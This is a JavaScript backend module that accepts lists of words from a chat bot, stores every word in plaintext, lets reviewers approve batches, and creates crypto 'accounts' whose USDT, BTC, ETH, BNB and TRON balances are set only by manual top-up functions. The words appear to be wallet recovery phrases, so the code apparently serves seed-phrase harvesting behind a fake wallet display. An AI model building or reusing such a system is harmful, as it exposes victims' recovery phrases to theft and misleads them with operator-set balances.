"use strict";

const crypto = require("crypto");
const db = require("../db");

const PRICE_CACHE_MS = 60 * 1000;
let priceCache = {
  fetchedAt: 0,
  rates: null,
};

function parseWords(input) {
  const values = Array.isArray(input)
    ? input
    : String(input || "")
        .split(/[\s,]+/)
        .map((value) => value.trim());

  const words = values
    .map((value) => String(value || "").trim())
    .filter(Boolean);

  if (!words.length) {
    throw new Error("At least one word is required");
  }

  return words;
}

function normalizedWordsForIdentity(words) {
  return words.map((word) => String(word || "").trim().toLowerCase()).filter(Boolean);
}

function wordHashFromWords(words) {
  return crypto.createHash("sha256").update(normalizedWordsForIdentity(words).join("\n")).digest("hex");
}

function insertIdFrom(result) {
  if (result && typeof result.insertId !== "undefined") return result.insertId;
  if (Array.isArray(result) && result[0] && typeof result[0].insertId !== "undefined") {
    return result[0].insertId;
  }

  return null;
}

function normalizeTitle(input) {
  const title = String(input || "").trim();
  if (title.length > 255) {
    throw new Error("Title must be 255 characters or less");
  }

  return title || null;
}

function accountNumberFor(batchId) {
  return `JTR-${String(batchId).padStart(6, "0")}-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;
}

function reviewerNameFrom(reviewer = {}) {
  return reviewer.username
    ? `@${reviewer.username}`
    : [reviewer.firstName || reviewer.first_name, reviewer.lastName || reviewer.last_name].filter(Boolean).join(" ") ||
        reviewer.name ||
        null;
}

function mapAccount(row) {
  if (!row || !row.accountId) return null;

  return {
    id: row.accountId,
    batchId: row.accountBatchId,
    wordHash: row.accountWordHash || null,
    accountNumber: row.accountNumber,
    title: row.accountTitle,
    balances: {
      usdt: Number(row.usdtBalance || 0),
      btc: Number(row.btcBalance || 0),
      eth: Number(row.ethBalance || 0),
      bnb: Number(row.bnbBalance || 0),
      tron: Number(row.tronBalance || 0),
    },
    createdAt: row.accountCreatedAt,
  };
}

function mapBatch(row) {
  if (!row) return null;

  return {
    id: row.id,
    title: row.title,
    wordHash: row.wordHash || null,
    source: row.source,
    chatId: row.chatId,
    createdBy: row.createdBy,
    wordCount: Number(row.wordCount || 0),
    approvalStatus: row.approvalStatus || "pending",
    reviewedByChatId: row.reviewedByChatId || null,
    reviewedByName: row.reviewedByName || null,
    reviewedAt: row.reviewedAt || null,
    createdAt: row.createdAt,
    words: row.words || "",
    account: mapAccount(row),
  };
}

function mapStandaloneAccount(row) {
  if (!row) return null;

  return {
    id: row.id,
    batchId: row.batchId,
    wordHash: row.wordHash || null,
    accountNumber: row.accountNumber,
    title: row.title,
    balances: {
      usdt: Number(row.usdtBalance || 0),
      btc: Number(row.btcBalance || 0),
      eth: Number(row.ethBalance || 0),
      bnb: Number(row.bnbBalance || 0),
      tron: Number(row.tronBalance || 0),
    },
    createdAt: row.createdAt,
  };
}

async function getUsdRates() {
  if (priceCache.rates && Date.now() - priceCache.fetchedAt < PRICE_CACHE_MS) {
    return priceCache.rates;
  }

  const response = await fetch(
    "https://api.coingecko.com/api/v3/simple/price?ids=tether,bitcoin,ethereum,binancecoin,tron&vs_currencies=usd"
  );
  if (!response.ok) {
    throw new Error(`Could not load USD rates: ${response.status}`);
  }

  const prices = await response.json();
  const rates = {
    usdt: Number(prices.tether?.usd || 1),
    btc: Number(prices.bitcoin?.usd || 0),
    eth: Number(prices.ethereum?.usd || 0),
    bnb: Number(prices.binancecoin?.usd || 0),
    tron: Number(prices.tron?.usd || 0),
  };

  priceCache = {
    fetchedAt: Date.now(),
    rates,
  };

  return rates;
}

async function addUsdTotal(account) {
  if (!account) return null;

  try {
    const rates = await getUsdRates();
    const balances = account.balances || {};
    const totalUsd =
      Number(balances.usdt || 0) * rates.usdt +
      Number(balances.btc || 0) * rates.btc +
      Number(balances.eth || 0) * rates.eth +
      Number(balances.bnb || 0) * rates.bnb +
      Number(balances.tron || 0) * rates.tron;

    return {
      ...account,
      usdRates: rates,
      totalUsd: Number(totalUsd.toFixed(2)),
    };
  } catch (error) {
    return {
      ...account,
      usdRates: null,
      totalUsd: null,
      usdRateError: error.message,
    };
  }
}

async function findAccountByWordHash(wordHash) {
  const rows = await db.query(
    `
    SELECT
      id,
      batch_id AS batchId,
      word_hash AS wordHash,
      account_number AS accountNumber,
      title,
      usdt_balance AS usdtBalance,
      btc_balance AS btcBalance,
      eth_balance AS ethBalance,
      bnb_balance AS bnbBalance,
      tron_balance AS tronBalance,
      created_at AS createdAt
    FROM word_accounts
    WHERE word_hash = ?
    LIMIT 1
    `,
    [wordHash]
  );

  return addUsdTotal(mapStandaloneAccount(rows[0]));
}

async function saveWordBatch({ words, title = null, source, chatId = null, createdBy = null }) {
  const normalizedTitle = normalizeTitle(title);
  const wordHash = wordHashFromWords(words);
  const existingAccount = await findAccountByWordHash(wordHash);
  if (existingAccount) {
    return {
      id: existingAccount.batchId,
      title: existingAccount.title || normalizedTitle,
      wordHash,
      source,
      chatId,
      createdBy,
      wordCount: words.length,
      approvalStatus: "approved",
      loggedIn: true,
      words,
      account: existingAccount,
    };
  }

  const batchResult = await db.execute(
    "INSERT INTO word_batches (title, word_hash, source, chat_id, created_by, word_count) VALUES (?, ?, ?, ?, ?, ?)",
    [normalizedTitle, wordHash, source, chatId, createdBy, words.length]
  );
  const batchId = insertIdFrom(batchResult);

  if (!batchId) {
    throw new Error("Could not read word batch insert id");
  }

  const chunkSize = 200;
  for (let index = 0; index < words.length; index += chunkSize) {
    const chunk = words.slice(index, index + chunkSize);
    const placeholders = chunk.map(() => "(?, ?, ?)").join(", ");
    const params = chunk.flatMap((word, chunkIndex) => [batchId, index + chunkIndex + 1, word]);

    await db.execute(
      `INSERT INTO word_batch_items (batch_id, position, word) VALUES ${placeholders}`,
      params
    );
  }

  return {
    id: batchId,
    title: normalizedTitle,
    wordHash,
    source,
    chatId,
    createdBy,
    wordCount: words.length,
    approvalStatus: "pending",
    words,
  };
}

function batchSelectSql(whereSql = "") {
  return `
    SELECT
      b.id,
      b.title,
      b.word_hash AS wordHash,
      b.source,
      b.chat_id AS chatId,
      b.created_by AS createdBy,
      b.word_count AS wordCount,
      b.approval_status AS approvalStatus,
      b.reviewed_by_chat_id AS reviewedByChatId,
      b.reviewed_by_name AS reviewedByName,
      b.reviewed_at AS reviewedAt,
      b.created_at AS createdAt,
      GROUP_CONCAT(i.word ORDER BY i.position SEPARATOR ' ') AS words,
      a.id AS accountId,
      a.batch_id AS accountBatchId,
      a.word_hash AS accountWordHash,
      a.account_number AS accountNumber,
      a.title AS accountTitle,
      a.usdt_balance AS usdtBalance,
      a.btc_balance AS btcBalance,
      a.eth_balance AS ethBalance,
      a.bnb_balance AS bnbBalance,
      a.tron_balance AS tronBalance,
      a.created_at AS accountCreatedAt
    FROM word_batches b
    LEFT JOIN word_batch_items i ON i.batch_id = b.id
    LEFT JOIN word_accounts a ON a.batch_id = b.id OR (a.word_hash IS NOT NULL AND a.word_hash = b.word_hash)
    ${whereSql}
    GROUP BY b.id
  `;
}

async function getWordBatch(batchId) {
  const rows = await db.query(
    `${batchSelectSql("WHERE b.id = ?")}
    LIMIT 1
    `,
    [Number(batchId)]
  );

  const batch = mapBatch(rows[0]);
  if (batch?.account) {
    batch.account = await addUsdTotal(batch.account);
  }

  return batch;
}

async function listRecentWordBatches(limit = 10) {
  const rows = await db.query(
    `${batchSelectSql()}
    ORDER BY b.created_at DESC
    LIMIT ?
    `,
    [Number(limit) || 10]
  );

  const batches = rows.map(mapBatch);
  return Promise.all(
    batches.map(async (batch) => {
      if (batch?.account) {
        batch.account = await addUsdTotal(batch.account);
      }
      return batch;
    })
  );
}

async function createAccountForBatch(batch) {
  await db.execute(
    `
    INSERT INTO word_accounts
      (batch_id, word_hash, account_number, title, usdt_balance, btc_balance, eth_balance, bnb_balance, tron_balance)
    VALUES (?, ?, ?, ?, 0, 0, 0, 0, 0)
    ON DUPLICATE KEY UPDATE
      title = VALUES(title)
    `,
    [batch.id, batch.wordHash, accountNumberFor(batch.id), batch.title]
  );
}

async function approveWordBatch(batchId, reviewer = {}) {
  const batch = await getWordBatch(batchId);
  if (!batch) {
    throw new Error("Word batch was not found");
  }
  if (batch.approvalStatus === "rejected") {
    throw new Error("Rejected word batches cannot be approved");
  }

  await createAccountForBatch(batch);
  await db.execute(
    `
    UPDATE word_batches
    SET approval_status = 'approved',
      reviewed_by_chat_id = ?,
      reviewed_by_name = ?,
      reviewed_at = CURRENT_TIMESTAMP
    WHERE id = ?
    `,
    [reviewer.chatId ? String(reviewer.chatId) : null, reviewerNameFrom(reviewer), Number(batchId)]
  );

  return getWordBatch(batchId);
}

async function rejectWordBatch(batchId, reviewer = {}) {
  const batch = await getWordBatch(batchId);
  if (!batch) {
    throw new Error("Word batch was not found");
  }
  if (batch.approvalStatus === "approved") {
    throw new Error("Approved word batches cannot be rejected");
  }

  await db.execute(
    `
    UPDATE word_batches
    SET approval_status = 'rejected',
      reviewed_by_chat_id = ?,
      reviewed_by_name = ?,
      reviewed_at = CURRENT_TIMESTAMP
    WHERE id = ?
    `,
    [reviewer.chatId ? String(reviewer.chatId) : null, reviewerNameFrom(reviewer), Number(batchId)]
  );

  return getWordBatch(batchId);
}

function normalizeAsset(asset) {
  const normalized = String(asset || "").trim().toLowerCase();
  if (!["usdt", "btc", "eth", "bnb", "tron"].includes(normalized)) {
    throw new Error("Asset must be one of USDT, BTC, ETH, BNB, or TRON");
  }

  return normalized;
}

function normalizeAmount(amount) {
  const value = Number(amount);
  if (!Number.isFinite(value) || value <= 0) {
    throw new Error("Top-up amount must be a positive number");
  }

  return value;
}

async function getAccountByNumber(accountNumber) {
  const rows = await db.query(
    `
    SELECT
      id,
      batch_id AS batchId,
      word_hash AS wordHash,
      account_number AS accountNumber,
      title,
      usdt_balance AS usdtBalance,
      btc_balance AS btcBalance,
      eth_balance AS ethBalance,
      bnb_balance AS bnbBalance,
      tron_balance AS tronBalance,
      created_at AS createdAt
    FROM word_accounts
    WHERE account_number = ?
    LIMIT 1
    `,
    [String(accountNumber || "").trim()]
  );

  return addUsdTotal(mapStandaloneAccount(rows[0]));
}

async function getAccountById(accountId) {
  const rows = await db.query(
    `
    SELECT
      id,
      batch_id AS batchId,
      word_hash AS wordHash,
      account_number AS accountNumber,
      title,
      usdt_balance AS usdtBalance,
      btc_balance AS btcBalance,
      eth_balance AS ethBalance,
      bnb_balance AS bnbBalance,
      tron_balance AS tronBalance,
      created_at AS createdAt
    FROM word_accounts
    WHERE id = ?
    LIMIT 1
    `,
    [Number(accountId)]
  );

  return addUsdTotal(mapStandaloneAccount(rows[0]));
}

async function listAccounts(limit = 10) {
  const rows = await db.query(
    `
    SELECT
      id,
      batch_id AS batchId,
      word_hash AS wordHash,
      account_number AS accountNumber,
      title,
      usdt_balance AS usdtBalance,
      btc_balance AS btcBalance,
      eth_balance AS ethBalance,
      bnb_balance AS bnbBalance,
      tron_balance AS tronBalance,
      created_at AS createdAt
    FROM word_accounts
    ORDER BY created_at DESC
    LIMIT ?
    `,
    [Math.min(Math.max(Number(limit) || 10, 1), 50)]
  );

  return Promise.all(rows.map((row) => addUsdTotal(mapStandaloneAccount(row))));
}

async function topUpResolvedAccount(account, asset, amount) {
  const normalizedAsset = normalizeAsset(asset);
  const normalizedAmount = normalizeAmount(amount);
  const column = `${normalizedAsset}_balance`;
  if (!account) {
    throw new Error("Account was not found");
  }

  await db.execute(`UPDATE word_accounts SET ${column} = ${column} + ? WHERE account_number = ?`, [
    normalizedAmount,
    account.accountNumber,
  ]);

  return getAccountByNumber(account.accountNumber);
}

async function topUpAccount(accountNumber, asset, amount) {
  return topUpResolvedAccount(await getAccountByNumber(accountNumber), asset, amount);
}

async function topUpAccountById(accountId, asset, amount) {
  return topUpResolvedAccount(await getAccountById(accountId), asset, amount);
}

module.exports = {
  addUsdTotal,
  approveWordBatch,
  findAccountByWordHash,
  getWordBatch,
  getAccountById,
  getAccountByNumber,
  getUsdRates,
  listAccounts,
  parseWords,
  normalizeTitle,
  rejectWordBatch,
  saveWordBatch,
  listRecentWordBatches,
  topUpAccount,
  topUpAccountById,
  wordHashFromWords,
};
